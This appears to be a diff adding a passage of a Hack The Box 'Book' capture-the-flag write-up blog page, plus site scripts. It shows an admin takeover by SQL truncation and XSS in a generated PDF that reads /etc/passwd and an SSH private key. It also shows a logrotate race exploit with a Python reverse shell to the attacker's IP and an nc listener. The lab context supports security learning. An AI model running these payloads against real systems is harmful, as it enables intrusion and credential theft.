+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 4</span>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 5</span>Accept-Language: en-US,en;q=0.5
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 6</span>Accept-Encoding: gzip, deflate
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 7</span>Referer: http://book.htb/index.php
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 8</span>Content-Type: application/x-www-form-urlencoded
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 9</span>Connection: close
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">10</span>Upgrade-Insecure-Requests: 1
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">11</span>Content-Length: 61
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">12</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">13</span>name=admin+++++a&amp;email=admin%40book.htb++++++a&amp;password=hello
+</code></pre></div><p>We have URL encoded the params after adding necessary number of spaces. Now we
+send the POST request and try logging in with the admin account with our set
+password. And we succeed.</p>
+<p><img src="/img/htb_book/6.png" alt=""></p>
+<h2 id="file-upload">File upload</h2>
+<p>Now, logged in as admin, we can view the collections files stored in a pdf file
+with links to the files. Submitting our php-web-shell, we do not see</p>
+<p><img src="/img/htb_book/8.png" alt=""></p>
+<p>that in our collections, so it was not uploaded. We are only allowed to upload
+pdf files. We upload a random pdf file and download the collections pdf. We see
+that our included pdf is listed with a number. So our upload gets renamed by
+a number.</p>
+<p>Another thing we notice is that the pdf is dynamically generated each time we
+request for a download. This dynamic generation of the pdf file can be
+exploited using XSS since we control the input filename. It took me quite
+a long time to fine this. This can be used to read local files. This has been
+explained <a href="https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html">here.</a></p>
+<p>So in order to exploit the XSS, we input the following script as the &ldquo;Book
+Title&rdquo; and enter any random pdf file</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>&lt;script&gt;x=<span style="color:#6ab825;font-weight:bold">new</span> XMLHttpRequest;x.onload=<span style="color:#6ab825;font-weight:bold">function</span>(){<span style="color:#24909d">document</span>.write(<span style="color:#6ab825;font-weight:bold">this</span>.responseText)};x.open(<span style="color:#ed9d13">&#34;GET&#34;</span>,<span style="color:#ed9d13">&#34;file:///etc/passwd&#34;</span>);x.send();&lt;<span style="color:#a61717;background-color:#e3d2d2">/script&gt;</span>
+</code></pre></div><p>Then we download the collections pdf from the admin page and see the
+/etc/passwd file
+79101.pdf
+<img src="/img/htb_book/9.png" alt=""></p>
+<p>We find a user named <strong>reader</strong></p>
+<h1 id="privilege-escalation---user">Privilege Escalation - User</h1>
+<h2 id="getting-id_rsa-of-user">Getting id_rsa of user</h2>
+<p>Since we can read any local files, lets try reading the id_rsa of the found
+user &ldquo;reader&rdquo; at /home/reader/.ssh/id_rsa.</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>&lt;script&gt;x=<span style="color:#6ab825;font-weight:bold">new</span> XMLHttpRequest;x.onload=<span style="color:#6ab825;font-weight:bold">function</span>(){<span style="color:#24909d">document</span>.write(<span style="color:#6ab825;font-weight:bold">this</span>.responseText)};x.open(<span style="color:#ed9d13">&#34;GET&#34;</span>,<span style="color:#ed9d13">&#34;file:///home/reader/.ssh/id_rsa&#34;</span>);x.send();&lt;<span style="color:#a61717;background-color:#e3d2d2">/script&gt;</span>
+</code></pre></div><p>And we get the private key. We can use this for ssh login to the user account.</p>
+<p><img src="/img/htb_book/10.png" alt=""></p>
+<h2 id="pdf2txt-conversion">pdf2txt conversion</h2>
+<p>The key if copied from the pdf to a file, is not in the correcto id_rsa format.
+To convert the pdf to txt, we use a python tool called <a href="https://github.com/pdfminer/pdfminer.six">pdfminer.six</a></p>
+<p>We install it using</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>sudo apt install python3-pdfminer
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">2</span>pip install pdfminer.six
+</code></pre></div><p>Then, we convert the pdf to txt and do some editing in spaces to get the
+correct format id_rsa.</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>python3 /usr/local/bin/pdf2txt.py 64757.pdf&gt;id_rsa
+</code></pre></div><h2 id="ssh-login-with-id_rsa">SSH login with id_rsa</h2>
+<p>We change the permissions of the id_rsa</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>chmod <span style="color:#3677a9">600</span> id_rsa
+</code></pre></div><p>And then we login to the machine as user reader</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>bash -i id_rsa reader@book.htb
+</code></pre></div><p>And we get the shell of the user. And we can read the user.txt</p>
+<p><img src="/img/htb_book/11.png" alt=""></p>
+<h1 id="privilege-escalation---root">Privilege Escalation - root</h1>
+<h2 id="enumeration-1">Enumeration</h2>
+<p>linpeas.sh gives us some interesting info about system timers</p>
+<p><img src="/img/htb_book/12.png" alt=""></p>
+<p>We find a timer named book.timer that seems to run at an interval of 1m.</p>
+<p>To see what the timer executes, we run pspy64 to monitor the processes. And get
+what commands the timer runs.</p>
+<p><img src="/img/htb_book/13.png" alt=""></p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>/usr/sbin/logrotate -f /root/log.cfg
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">2</span>/bin/sh /root/log.sh
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">3</span>sleep <span style="color:#3677a9">5</span>
+</code></pre></div><p>The timer seems to run logrotate</p>
+<h2 id="logrotate-race-condition-exploit">logrotate race condition exploit</h2>
+<p>“Log rotation” refers to the practice of archiving an application’s current
+log, starting a fresh log, and deleting older logs. Googling around we find
+that logrotate is vulnerable to a race condition.</p>
+<p>This working of this exploit is described fully at <a href="https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition">feedyourhead</a>.
+A PoC can be found on <a href="https://github.com/whotwagner/logrotten">github</a> by
+whotwanger. We can use this PoC for our case.</p>
+<p>As per the instructions, we execute the follwing :</p>
+<ol>
+<li>We download the c file to our target and compile it. Next we create our
+payload containing our reverse shell. We need to background the shell,
+otherwise we will not get a stable shell. Next we run the compiled source
+with required args.</li>
+</ol>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>wget http://10.10.15.237:8000/logrotten.c
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">2</span>gcc -o logrotten logrotten.c
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">3</span><span style="color:#24909d">echo</span> <span style="color:#ed9d13">&#34;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;</span>10.10.15.237<span style="color:#ed9d13">&#34;,1234));os.dup2(s.fileno(),0);
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">4</span><span style="color:#ed9d13">os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;</span>/bin/sh<span style="color:#ed9d13">&#34;,&#34;</span>-i<span style="color:#ed9d13">&#34;]);&#39; &amp;
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">5</span><span style="color:#ed9d13">./logrotten -d -p ./payloadfile /home/reader/backups/access.log
+</span></code></pre></div><ol start="2">
+<li>Next we need to write some random contents to the access.log file in backups. This
+necessary because the log file is not rotated if the file is empty and the
+<code>notifempty</code> parameter is set in the conf file. It is safe to write a
+big amount of junk into the logfile in case the <code>size</code> parameter is set
+in the conf file for logrotate, in which case, the rotation will only occur
+when the logfile gets larger than the sepcified size.</li>
+</ol>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span><span style="color:#24909d">echo</span> hello &gt; access.log
+</code></pre></div><ol start="3">
+<li>We fire up a nc listener on our host</li>
+</ol>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>nc -lnvp <span style="color:#3677a9">1234</span>
+</code></pre></div><p>And we get a root shell. We can now read our root.txt file.</p>
+<p><img src="/img/htb_book/14.png" alt=""></p>
+<p>PS: The root shell will only be active for a short time. So the commands need
+to be executed fast. After a short time, the shell exists but the tty cannot be
+accessed anymore and you will get an error:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>/bin/sh: 3: Cannot <span style="color:#24909d">set</span> tty process group (Inappropriate ioctl <span style="color:#6ab825;font-weight:bold">for</span> device)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">2</span>/bin/sh: 3: Cannot <span style="color:#24909d">set</span> tty process group (Inappropriate ioctl <span style="color:#6ab825;font-weight:bold">for</span> device)
+</code></pre></div><p>The reason this happens, according to my guess, is that when our payload gets
+executed as root, the shell opens as interactive tty. But a while later, the
+child process id disconnected from the tty. So we see a zombie shell.</p>
+<h1 id="resources">Resources</h1>
+<ul>
+<li><a href="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf">https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf</a></li>
+<li><a href="https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html">https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html</a></li>
+<li><a href="https://support.rackspace.com/how-to/understanding-logrotate-utility/">https://support.rackspace.com/how-to/understanding-logrotate-utility/</a></li>
+<li><a href="https://github.com/whotwagner/logrotten">https://github.com/whotwagner/logrotten</a></li>
+<li><a href="https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition">https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition</a></li>
+<li><a href="https://tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges">https://tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges</a></li>
+</ul>
+
+    </div>
+    <div class="article-footer">
+<blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    <li class="post-copyright-link hidden-xs">
+      <strong>Permalink: </strong>
+      <a href="https://fmash16.github.io/writeups/hackthebox-writeups/hackthebox-book-writeup/" title="Hackthebox - Book Writeup" target="_blank" rel="external">https://fmash16.github.io/writeups/hackthebox-writeups/hackthebox-book-writeup/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>License：</strong><a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN</a>
+    </li>
+  </ul>
+</blockquote>
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/fmash16" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="https://fmash16.github.io/avatar.png" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/fmash16" target="_blank"><span class="text-dark">fmash16</span></a></h3>
+        <div>Hack the Planet</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+    </div>
+  </article>
+<section id="comments">
+</section>
+
+</div><nav class="bar bar-footer clearfix" data-stick-bottom>
+    <div class="bar-inner">
+        <ul class="pager pull-left">
+            <li class="prev">
+                <a href="https://fmash16.github.io/writeups/tryhackme-writeups/tryhackme-cmess-writeup/" title="TryHackMe - CMesS Writeup"><i
+                        class="icon icon-angle-left"
+                        aria-hidden="true"></i><span>&nbsp;&nbsp;Older</span></a>
+            </li>
+            <li class="next">
+                <a href="https://fmash16.github.io/writeups/tryhackme-writeups/tryhackme-wonderland-writeup/"
+                    title="TryHackMe - Wonderland Writeup"><span>Newer&nbsp;&nbsp;</span><i
+                        class="icon icon-angle-right" aria-hidden="true"></i></a>
+            </li>
+            
+            <li class="toggle-toc">
+                <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false"
+                    title="Catalogue" role="button">
+                    <span>[&nbsp;</span><span>Index</span>
+                    <i class="text-collapsed icon icon-anchor"></i>
+                    <i class="text-in icon icon-close"></i>
+                    <span>]</span>
+                </a>
+            </li>
+        </ul>
+        <div class="bar-right">
+            <div class="share-component" data-sites="facebook,twitter"
+                data-mobile-sites="">Share on:</div>
+        </div>
+    </div>
+</nav>
+
+
+
+</main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+<ul class="social-links">
+    <li><a href="https://github.com/fmash16" target="_blank" title="github" data-toggle=tooltip data-placement=top >
+            <i class="icon icon-github"></i></a></li>
+    <li><a href="https://fmash16.github.io/index.xml" target="_blank" title="rss" data-toggle=tooltip data-placement=top >
+            <i class="icon icon-rss"></i></a></li>
+    <li><a href="https://twitter.com/fmash16" target="_blank" title="twitter" data-toggle=tooltip data-placement=top >
+            <i class="icon icon-twitter"></i></a></li>
+</ul>
+  <div class="copyright">
+    &copy;2020  -
+    2020
+    
+    
+    </div>
+  </div>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_SVG"></script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+            showMathMenu: false, //disables context menu
+            tex2jax: {
+            inlineMath: [ ['$','$'], ['\\(','\\)'] ]
+           }
+    });
+</script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+<script>
+    window.jQuery || document.write('<script src="js/jquery.min.js"></script>')
+</script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/highlight.min.js"></script><script>
+    hljs.configure({
+        tabReplace: '    ', 
+        classPrefix: ''     
+        
+    })
+    hljs.initHighlightingOnLoad();
+</script>
+<script src="https://fmash16.github.io/js/application.min.bdeb64b910570b6c41badc6a05b7afb0c8ad9efd8525de3c7257d59e786326a3.js"></script>
+<script src="https://fmash16.github.io/js/plugin.min.51ff8c7317566f82259170fa36e09c4493adc9b9378b427a01ad3f017ebac7dd.js"></script>
+
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                CATEGORIES: 'Categories',
+                TAGS: 'Tags',
+            },
+            ROOT_URL: 'https:\/\/fmash16.github.io\/',
+            CONTENT_URL: 'https:\/\/fmash16.github.io\/\/searchindex.json ',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script type="text/javascript" src="https://fmash16.github.io/js/insight.min.7f3407251ef14950645ac695d0cf7cd29c5cabfb6916e63dcb54b83d8f1fc2126d10bd5446875e78d27a76ecd651a3532b49a7e4da02ee4de51660edba2d23f1.js" defer></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+<script>
+    tocbot.init({
+        
+        tocSelector: '.js-toc',
+        
+        contentSelector: '.js-toc-content',
+        
+        headingSelector: 'h1, h2, h3',
+        
+        hasInnerContainers: true,
+    });
+</script>
+
+
+/* copy code button */
+<script>
+function addCopyButtons(clipboard) {
+    document.querySelectorAll('pre > code').forEach(function (codeBlock) {
+        var button = document.createElement('button');
+        button.className = 'copy-code-button';
+        button.type = 'button';
+        button.innerText = 'Copy';
+
+        button.addEventListener('click', function () {
+              
+            tmp = codeBlock.innerText.split("\n");
+            cutChar = (tmp.length>8) ? 2 : 1;
+            for(i=0; i<tmp.length; i++){
+              tmp[i] = tmp[i].substring(cutChar);
             }
+            block = tmp.join("\n");
+            clipboard.writeText(block).then(function () {
+                
 
-            button[0].addEventListener("click", function () {
-                login(password[0].value)
-            })
+                button.blur();
 
-            document.onkeydown = function (e) {
-                e = e || window.event
-                if (e.keyCode == 13) {
-                    login(password[0].value)
-                }
-            }
-        </script>
-    </body>
+                button.innerText = 'Copied!';
+
+                setTimeout(function () {
+                    button.innerText = 'Copy';
+                }, 2000);
+            }, function (error) {
+                button.innerText = 'Error';
+            });
+        });
+
+        var pre = codeBlock.parentNode;
+        if (pre.parentNode.classList.contains('highlight')) {
+            var highlight = pre.parentNode;
+            highlight.parentNode.insertBefore(button, highlight);
+        } else {
+            pre.parentNode.insertBefore(button, pre);
+        }
+    });
+}
+if (navigator && navigator.clipboard) {
+    addCopyButtons(navigator.clipboard);
+} else {
+    var script = document.createElement('script');
+    script.src = 'https://cdnjs.cloudflare.com/ajax/libs/clipboard-polyfill/2.7.0/clipboard-polyfill.promise.js';
+    script.integrity = 'sha256-waClS2re9NUbXRsryKoof+F9qc1gjjIhc2eT7ZbIv94=';
+    script.crossOrigin = 'anonymous';
+    script.onload = function() {
+        addCopyButtons(clipboard);
+    };
+
+    document.body.appendChild(script);
+}
+
+</script>
+
+
+
+  </body>
 </html>
